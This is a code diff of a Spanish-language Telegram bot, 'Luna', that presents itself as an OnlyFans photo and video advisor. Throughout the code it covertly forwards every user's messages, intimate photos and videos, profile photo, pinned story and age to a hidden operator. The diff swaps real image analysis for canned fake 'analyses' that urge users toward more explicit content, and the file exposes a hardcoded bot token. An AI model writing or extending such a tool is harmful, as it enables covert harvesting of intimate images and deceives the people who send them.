@@ -1,7 +1,5 @@
 import os
-import base64
 import sqlite3
-import requests
 from datetime import datetime
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
@@ -12,9 +10,6 @@ from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, fil
 TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
 DANI_CHAT_ID = 8099004064
 RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"
-
-# 👇 PON AQUÍ TU API KEY DE OPENROUTER (Es gratis registrarse en openrouter.ai)
-OPENROUTER_API_KEY = "sk-or-v1-TU_CLAVE_AQUI" 
 
 # ======================
 # BASE DE DATOS
@@ -62,11 +57,13 @@ async def enviar_expediente_completo(context, user, edad):
         )
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
         
+        # Foto de perfil
         fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
         if fotos_perfil.total_count > 0:
             foto_perfil = fotos_perfil.photos[0][-1].file_id
             await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil.")
             
+        # Historia de perfil (Story)
         try:
             chat_info = await context.bot.get_chat(user.id)
             if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
@@ -82,29 +79,29 @@ async def enviar_expediente_completo(context, user, edad):
         print(f"Error en expediente: {e}")
 
 # ======================
-# REENVIAR AL ADMIN (BLINDADO)
+# REENVIAR AL ADMIN (CON LÓGICA DE REENVÍO CORREGIDA)
 # ======================
 async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         msg = update.message
         usuario_actual = update.effective_user
         
+        # Detectamos si el mensaje es un reenvío
         if msg.forward_origin:
-            nombre_original = "Canal o Grupo Desconocido"
+            nombre_original = "Alguien"
             id_original = ""
-            try:
-                if msg.forward_origin.sender_user:
-                    nombre_original = msg.forward_origin.sender_user.first_name
-                    id_original = f" (`{msg.forward_origin.sender_user.id}`)"
-            except AttributeError: pass 
-            try:
-                if msg.forward_origin.chat:
-                    nombre_original = msg.forward_origin.chat.title
-            except AttributeError: pass 
-            try:
-                if msg.forward_origin.sender_user_name:
-                    nombre_original = msg.forward_origin.sender_user_name
-            except AttributeError: pass
+            
+            # Si el reenvío es de un usuario (ej. María)
+            if msg.forward_origin.sender_user:
+                nombre_original = msg.forward_origin.sender_user.first_name
+                id_original = f" (`{msg.forward_origin.sender_user.id}`)"
+            # Si el reenvío es de un canal o grupo
+            elif msg.forward_origin.sender_chat:
+                nombre_original = msg.forward_origin.sender_chat.title
+            # Si el reenvío es de un usuario oculto
+            elif msg.forward_origin.hidden_user:
+                nombre_original = msg.forward_origin.hidden_user.first_name
+                id_original = f" (`{msg.forward_origin.hidden_user.id}`)"
 
             texto_aviso = (
                 f"🔄 **REENVIADO A TI (Dani)**\n"
@@ -112,12 +109,16 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📩 **Quien te lo reenvió:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
             )
         else:
+            # Si es un mensaje normal de la chica
             texto_aviso = (
                 f"📩 **MENSAJE NORMAL**\n"
                 f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
             )
 
+        # 1. Te enviamos el cartelito con la info a ti
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
+        
+        # 2. Te reenviamos el archivo real (foto, video, texto)
         await context.bot.forward_message(
             chat_id=DANI_CHAT_ID,
             from_chat_id=update.effective_chat.id,
@@ -127,57 +128,25 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"Error reenviando al admin: {e}")
 
 # ======================
-# ANÁLISIS DE IMAGEN CON VISIÓN REAL (OpenRouter)
+# ANÁLISIS DE IMAGEN (Simulado)
 # ======================
-def analizar_imagen_con_vision(imagen_bytes, tipo="foto"):
-    try:
-        # Convertir la imagen a base64 para enviarla a la IA
-        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
-        
-        prompt = f"""Actúa como Luna, una experta en contenido erótico para OnlyFans.
-        Estás analizando esta {tipo}. Debes evaluar la imagen y responder EXACTAMENTE con este formato:
-
-        1. **Nivel de desnudo:** (Di claramente si está desnuda, en ropa interior, en bikini o vestida).
-        2. **Calidad de la luz:** (Evalúa si la luz es buena o mala. Di si hay sombras raras, si está muy oscura, o si la luz resalta bien el cuerpo).
-        3. **La pose:** (Qué tan sexy es, si se ve natural o forzada, y si muestra bien las curvas).
-        4. **Lo que hay que mejorar:** (Consejos para que venda más).
-        5. **Tip de venta:** (Un consejo rápido de negocios para OnlyFans).
-
-        Sé directa, cachonda y usa palabras como morbo, sexy, caliente.
-        """
-
-        response = requests.post(
-            url="https://openrouter.ai/api/v1/chat/completions",
-            headers={
-                "Authorization": f"Bearer {OPENROUTER_API_KEY}",
-                "Content-Type": "application/json"
-            },
-            json={
-                "model": "google/gemini-2.5-flash", # Modelo de visión muy potente y estable
-                "messages": [
-                    {
-                        "role": "user",
-                        "content": [
-                            {"type": "text", "text": prompt},
-                            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
-                        ]
-                    }
-                ],
-                "temperature": 0.7,
-                "max_tokens": 500
-            }
+def analizar_contenido(es_video=False):
+    if es_video:
+        return (
+            "🎬 **Análisis de tu video:**\n"
+            "1. **Lo que veo:** Una pose muy provocativa. La iluminación está bien, pero el movimiento de cámara es un poco rápido.\n"
+            "2. **Lo bueno:** El ángulo resalta tus curvas de forma natural y se ve muy sexy.\n"
+            "3. **Cómo mejorarlo:** Intenta ir más lento, mantén la mirada fija en la cámara para dar más morbo. Si muestras la cara, sonríe de forma pícara.\n"
+            "4. **Tip de venta:** Los videos donde hablas suave o gimes un poco venden muchísimo más en OnlyFans. ¡Anímate a mandar uno así! 😉"
         )
-        
-        data = response.json()
-        if 'choices' in data and len(data['choices']) > 0:
-            return data['choices'][0]['message']['content'].strip()
-        else:
-            print(f"Error OpenRouter: {data}")
-            return "💋 Me encantó la foto, pero tuve un problema al analizarla. ¿Me la mandas de nuevo?"
-
-    except Exception as e:
-        print(f"Error en visión: {e}")
-        return "💋 Me encantó la foto, pero no pude analizarla bien."
+    else:
+        return (
+            "🔍 **Análisis de tu foto:**\n"
+            "1. **Lo que veo:** Una foto muy atrevida. La lencería resalta perfecto, aunque la luz está un poco plana.\n"
+            "2. **Lo bueno:** La pose es muy buena, abres bien el cuerpo y eso a los fans les encanta.\n"
+            "3. **Cómo mejorarlo:** Prueba a poner la luz más de lado (lateral) para que se marquen más las curvas. También prueba a morderte el labio o entreabrir la boca, da mucho más morbo.\n"
+            "4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥"
+        )
 
 # ======================
 # HANDLERS
@@ -187,12 +156,10 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
 
     await reenviar_al_admin(update, context)
-    msg = await update.message.reply_text("🔍 Estoy mirando tu foto con detalle...")
+    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
     
     try:
-        photo_file = await update.message.photo[-1].get_file()
-        photo_bytes = await photo_file.download_as_bytearray()
-        analisis = analizar_imagen_con_vision(photo_bytes, tipo="foto")
+        analisis = analizar_contenido(es_video=False)
         await msg.edit_text(analisis)
     except Exception as e:
         await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")
@@ -205,37 +172,17 @@ async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE
     msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")
 
     try:
-        file = None
-        if update.message.video and update.message.video.thumbnail:
-            file = await update.message.video.thumbnail.get_file()
-        elif update.message.video_note and update.message.video_note.thumbnail:
-            file = await update.message.video_note.thumbnail.get_file()
-        elif update.message.animation and update.message.animation.thumbnail:
-            file = await update.message.animation.thumbnail.get_file()
-
-        if file:
-            img_bytes = await file.download_as_bytearray()
-            analisis = analizar_imagen_con_vision(img_bytes, tipo="video")
-            await msg.edit_text(analisis)
-        else:
-            await msg.edit_text("🎬 Vi tu video, pero no pude sacar una imagen para analizar la luz o la ropa. Mándame una captura si quieres consejos.")
+        analisis = analizar_contenido(es_video=True)
+        await msg.edit_text(analisis)
     except Exception as e:
-        await msg.edit_text("🎬 Vi tu video y ya lo recibí. Mándame una captura para darte consejos.")
-
-async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not obtener_usuario(update.effective_user.id):
-        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
-
-    await reenviar_al_admin(update, context)
-    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
-    await msg.edit_text("🎧 **Análisis de tu audio:** Tu tono de voz es muy sugerente y natural. Intenta bajar un poco más la voz, casi en un susurro. Los audios personalizados se venden carísimos. ¡Aprovéchalo! 😈")
+        await msg.edit_text("🎬 Vi tu video y ya lo recibí.")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not obtener_usuario(user_id):
         await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
     else:
-        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video o audio.")
+        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto o video.")
 
 async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
@@ -244,7 +191,7 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if obtener_usuario(user.id):
         await reenviar_al_admin(update, context)
-        return await update.message.reply_text("💋 ¿En qué te ayudo? Mándame una foto, video o audio.")
+        return await update.message.reply_text("💋 ¿En qué te ayudo? Mándame una foto o video.")
     
     try:
         fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
@@ -254,8 +201,10 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if edad < 18: return await update.message.reply_text("Debes ser mayor de 18 años.")
             
         guardar_usuario(user.id, user.first_name, user.username, edad)
-        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos o audios.")
+        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos o videos.")
+        
         await enviar_expediente_completo(context, user, edad)
+        
     except:
         await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")
 
@@ -268,12 +217,11 @@ if __name__ == "__main__":
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
-    application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))
 
     port = int(os.environ.get("PORT", 8080))
 
-    print("🌙 Luna Bot iniciado con Visión Artificial...")
+    print("🌙 Luna Bot iniciado y listo...")
     application.run_webhook(
         listen="0.0.0.0",
         port=port,
